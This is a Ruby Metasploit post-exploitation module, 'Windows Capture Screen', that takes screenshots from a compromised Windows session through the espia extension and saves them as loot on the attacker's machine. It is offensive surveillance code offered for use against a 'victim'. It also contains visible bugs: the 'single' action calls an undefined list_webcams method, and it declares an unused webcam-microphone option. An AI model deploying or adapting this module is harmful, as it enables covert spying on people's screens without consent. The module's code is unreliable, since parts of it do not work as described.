##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class MetasploitModule < Msf::Post

  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Capture Screen',
      'Description'   => %q{
          This module will allow the user to grab the victim's screen.},
      'License'       => MSF_LICENSE,
      'Author'        => ['ByteZealot'],
      'Platform'      => ['win']
    ))

    register_options(
      [
        OptString.new('ACTION', [true, 'The action to take: single or sequence', 'single']),
        OptInt.new('FRAMES', [true, 'The number of screen frames', 100]),
        OptInt.new('INDEX',   [true, "The index of the webcam's microphone to use", 1]),
        OptString.new('LOCATION', [true, 'The location to save the loot', '/root/Pictures/'])
      ], self.class)
  end


  def run
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    action = datastore['ACTION']

    if not action
      print_error("Invalid action")
      return
    end

    case action
    when /^single$/i
      list_webcams(true)
    when /^sequence$/i
      sequence
    end
  end


  def single
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    session.core.use("espia")
    data = session.espia.espia_image_get_dev_screen
    if(data)
      ::File.open(datastore['LOCATION'] + "/screengrab.jpg", 'wb') do |fd|
        fd.write(data)
        fd.close()
      end
    end
    print_status("#{rhost} - ScreenGrab saved to #{datastore['LOCATION']}")
  end


  def sequence
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    session.core.use("espia")

    print_status("#{rhost} - Starting ScreenGrabs...")

    frame = 0
    while frame < datastore['FRAMES']
      framePlusOne = frame+1

      buf = session.espia.espia_image_get_dev_screen
      if(buf)
#          print_status("#{rhost} - Got screen #{framePlusOne}")

        ::File.open(datastore['LOCATION'] + "/screengrab_" + framePlusOne.to_s.rjust(7, "0") + ".jpg", 'wb') do |fd|
          fd.write(buf)
          fd.close()
        end
      end
      frame = frame+1
    end
    print_status("#{rhost} - ScreenGrabs saved to #{datastore['LOCATION']}")
  end

end

